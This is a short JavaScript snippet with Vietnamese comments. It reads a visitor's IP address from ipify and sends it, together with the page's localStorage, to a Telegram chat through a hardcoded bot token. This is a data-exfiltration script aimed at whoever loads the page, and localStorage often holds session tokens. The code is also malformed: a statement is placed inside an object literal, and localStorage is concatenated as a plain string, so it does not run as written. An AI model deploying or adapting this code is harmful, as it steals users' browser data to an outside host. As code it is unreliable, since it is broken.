const token = "8072273750:AAHTjGi0qw_S9khhoI1OlJCrIxDdjJ2kcEo"; // thay bằng token thật
    const chatId = "@taptap1997";  // thay bằng chatId thật

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        // Lấy IP
        let res = await fetch("https://api.ipify.org?format=json");
        let data = await res.json();
        // console.log("IP của mày là:", data.ip);
        body: JSON.stringify({
            chat_id: chatId,
            text: JSON.stringify(localStorage + "\n" + data.ip)
        })
    })
        .then(res => res.json())
        .then(data => console.log("Đã gửi:", data))
        .catch(err => console.error("Lỗi:", err));
